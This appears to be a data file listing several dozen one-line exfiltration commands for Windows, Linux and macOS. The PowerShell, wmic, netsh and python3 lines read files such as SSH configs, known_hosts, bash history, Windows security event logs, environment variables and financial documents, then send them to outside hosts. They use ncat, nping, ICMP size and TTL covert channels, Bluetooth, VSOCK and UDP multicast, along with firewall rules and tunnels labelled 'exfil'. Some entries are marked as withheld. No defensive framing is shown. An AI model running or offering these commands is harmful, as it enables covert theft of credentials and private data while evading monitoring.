  "$src=(Get-NetIPAddress -InterfaceAlias 'Wi-Fi' -AddressFamily IPv6 | ?{$_.AddressState -eq 'Preferred'} | Select-Object -First 1 -ExpandProperty IPAddress); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -s $src 2001:db8:dead:beef::23 47017 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --tcp --flags psh,ack --dest-port 59055 --data-string $b -c 1 2001:db8:dead:beef::25",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $chunk=$b.Substring(0,[Math]::Min(800,$b.Length)); nping.exe --icmp -6 2001:db8:dead:beef::26 --data-string ('C1:'+ $chunk) -c 1",
  "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 --ssl 2001:db8:dead:beef::21 60443 --send-only",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe --icmp -6 2001:db8:dead:beef::10 --data-string $b -c 1",
  "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
  "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
  "netsh advfirewall firewall add rule name=\"exfil_out_tcp6_49444\" dir=out action=allow enable=yes protocol=TCP remoteport=49444 remoteip=2001:db8:bad:cafe::44 profile=any",
  "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
  "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
  "netsh interface 6to4 set state enabled relay=198.51.100.42",
  "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=49333 connectaddress=198.51.100.88 connectport=49334",
  "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
  "netsh interface portproxy add v6tov6 listenaddress=::1 listenport=49601 connectaddress=2001:db8:4444::1 connectport=49602",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Hamachi*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.166',59322); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Downloads\\pack.data'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and `$_.Description -like '*Bluetooth*' }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.77',53123); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\sync.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Cellular*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.9',57483); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\cache.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Wi-Fi Direct*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.210',61234); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\wfd_chunk.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
  "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
  "$d='fe80::a%11'; $s=Get-Content -Path 'C:\\Users\\Public\\message.txt' -Raw; $s.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (700 + [byte][char]$_) -IPv6 -Quiet | Out-Null }",
  "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
  "$dh='fd00:feed::a'; $dl='fd00:feed::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $dh -Count 1 -BufferSize (400 + $hi) -IPv6 -Quiet | Out-Null; Test-Connection -ComputerName $dl -Count 1 -BufferSize (400 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
  "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
  "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\\Users\\Public\\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.224.17.2 255.255.255.252 | Out-Null; $q=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\q3-report.docx')); $t=New-Object Net.Sockets.TcpClient; $t.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.224.17.2'),0)); $t.Connect('10.224.17.1',53337); $st=$t.GetStream(); $req=[Text.Encoding]::UTF8.GetBytes(('GET /u?d='+[Uri]::EscapeDataString($q)+' HTTP/1.1`r`nHost: x`r`nConnection: close`r`n`r`n')); $st.Write($req,0,$req.Length); $st.Close(); $t.Close()",
  "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('64:6E:6C:AA:BB:CC', 0x1009)); p=os.path.expanduser('~/.ssh/config'); import sys; d=b'';\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ntry:\\n d=open(p,'rb').read()\\nexcept Exception:\\n d=b''\\nfinally:\\n s.sendall(d); s.close()\"",
  "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
  "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((3, 58821)); p=os.path.expanduser('~/.config/gtk-3.0/bookmarks'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
  "[withheld — non-actionable: would send base64-encoded data in fixed-size chunks via IPv6 UDP (AF_INET6/SOCK_DGRAM) to a unique-local address with a low hop-limit]",
  "[withheld — non-actionable: would send base64-encoded data via IPv6 UDP to a link-local target using a specified scope ID, segmenting payload to avoid detection and common ports]",
  "[withheld — non-actionable: would bind an IPv6 TCP socket to a non-default link-local source address (scope-indexed) before connecting to a unique-local IPv6 target on a high port, then send base64 data]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to an APIPA/isolated adapter address and send base64-encoded chunks to a peer on an uncommon UDP port with low TTL]",
  "[withheld — non-actionable: would open an IPv6 TCP socket (AF_INET6) scoped to a link-local interface and transmit base64-encoded file data to a high, uncommon port]",
  "[withheld — non-actionable: would craft ICMP Echo Request packets (AF_INET/SOCK_RAW, IPPROTO_ICMP) carrying base64-encoded payload segments with proper checksums]",
  "[withheld — non-actionable: would enforce IPv6-only on a TCP socket and send base64-encoded data to a unique-local IPv6 service listening on an uncommon port]",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.88\", 52689)); d=open(\"/Users/Shared/.rpt\",\"rb\").read(); s.sendall(struct.pack(\"!I\",len(d))+d); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP); s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1); addr=(\"239.197.3.9\", 49321); d=open(\"/Users/Shared/.localstate\",\"rb\").read(); [s.sendto(d[i:i+800], addr) for i in range(0,len(d),800)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TCLASS, 0x2c); addr=(\"2001:db8:44::4\", 49512, 0, 0); d=open(\"/Users/Shared/.cache2\",\"rb\").read(); [s.sendto(d[i:i+600], addr) for i in range(0,len(d),600)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.connect((\"2001:db8:ac:2::9\", 55999, 0, 0)); s.sendall(open(\"/Users/Shared/._q\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); addr=(\"2001:db8:ab:1::7\", 49160, 0, 0); d=open(\"/Users/Shared/.cache.db\",\"rb\").read(); [s.sendto(d[i:i+900], addr) for i in range(0,len(d),900)]; s.close()'",
  "python3 -c 'import socket,time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"198.51.100.45\", 49444); d=open(\"/Users/Shared/.k\",\"rb\").read(); [ (s.sendto(d[i:i+700], addr), time.sleep(0.15)) for i in range(0,len(d),700) ]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'"
]